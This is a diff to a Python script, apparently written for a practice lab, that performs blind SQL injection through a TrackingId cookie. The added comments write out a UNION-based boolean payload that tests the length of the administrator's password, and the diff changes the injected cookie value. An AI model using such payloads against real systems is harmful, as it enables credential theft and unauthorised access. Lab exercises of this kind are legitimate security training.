@@ -5,6 +5,13 @@
 #   GitHub: github.com/WildfootW
 #   Copyleft (C) 2020 WildfootW All rights reversed.
 #
+# SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+# if any string return by this SQL request, we have welcome back page
+# SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'XYZ' UNION SELECT 'WildfootW' FROM users WHERE username = 'administrator' AND length(password) > 10-- 
+# if condition return True, the whole syntax return "WildfootW"
+#
+# MySQL
+#
 # Remeber modify Host. Do not use valid Cookies.
 # Char binary search failed due to don't know SQL char order
 # ('n' > "M" & 'n' < "N" can be True)
@@ -40,7 +47,7 @@ headers = {
 }
 
 cookies = {
-    'TrackingId': 'idI9R0yty9H7ZTsB', # use not valid id
+    'TrackingId': 'XYZ', # use invalid id
     'session': 'wsuAhTce2oFXHJEPYrUTW8X5JARNSZy9'
 }
 
